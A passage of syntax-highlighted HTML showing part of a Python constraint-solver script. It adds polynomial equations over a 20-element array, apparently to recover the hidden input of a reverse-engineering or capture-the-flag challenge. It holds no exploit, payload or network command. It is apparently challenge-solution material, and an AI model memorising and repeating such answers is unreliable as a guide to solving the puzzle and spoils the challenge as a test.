class=\"token operator\">+</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"184\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"185\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">5</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"186\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">30</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"187\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">12</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"188\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">13</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"189\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"190\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">17</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"191\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">18</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"192\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">19</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"193\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">20</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">966296</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"194\"></td><td><pre></pre></td></tr><tr><td data-num=\"195\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"196\"></td><td><pre><span class=\"token number\">14</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"197\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">13</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"198\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token number\">11</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">30</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">5</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">8</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"199\"></td><td><pre>     <span class=\"token operator\">*</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"200\"></td><td><pre>     <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"201\"></td><td><pre>     <span class=\"token operator\">+</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"202\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">12</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"203\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"204\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"205\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">17</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"206\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">18</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"207\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">20</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">19</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">254500223</span></pre></td></tr><tr><td data-num=\"208\"></td><td><pre>    <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"209\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"210\"></td><td><pre><span class=\"token number\">16</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"211\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">14</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"212\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">11</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"213\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">30</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"214\"></td><td><pre>     <span class=\"token operator\">+</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"215\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"216\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"217\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">5</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"218\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">8</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"219\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"220\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">12</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"221\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">13</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"222\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">17</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"223\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">18</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"224\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">19</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"225\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">20</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">6022286</span></pre></td></tr><tr><td data-num=\"226\"></td><td><pre>    <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"227\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"228\"></td><td><pre><span class=\"token number\">18</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"229\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"230\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">17</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"231\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">14</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"232\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">12</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"233\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">11</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"234\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">30</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"235\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">5</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"236\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"237\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"238\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"239\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">13</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"240\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"241\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">19</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"242\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">20</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">636956022</span></pre></td></tr><tr><td data-num=\"243\"></td><td><pre>    <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"244\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"245\"></td><td><pre><span class=\"token number\">20</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">19</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"246\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">13</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"247\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">12</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"248\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">11</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"249\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"250\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">30</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"251\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">5</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"252\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"253\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"254\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"255\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">14</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"256\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"257\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"258\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">17</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"259\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">18</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">10631829</span></pre></td></tr><tr><td data-num=\"260\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"261\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"262\"></td><td><pre><span class=\"token number\">20</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">19</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"263\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"264\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">17</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"265\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">18</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"266\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">14</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"267\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">13</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"268\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">11</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"269\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">12</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"270\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"271\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token number\">4</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">5</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">30</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"272\"></td><td><pre>     <span class=\"token operator\">+</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"273\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"274\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">8</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"275\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">6191333</span></pre></td></tr><tr><td data-num=\"276\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"277\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"278\"></td><td><pre><span class=\"token number\">14</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"279\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"280\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">5</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"281\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"282\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"283\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">30</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"284\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">11</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"285\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">13</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token 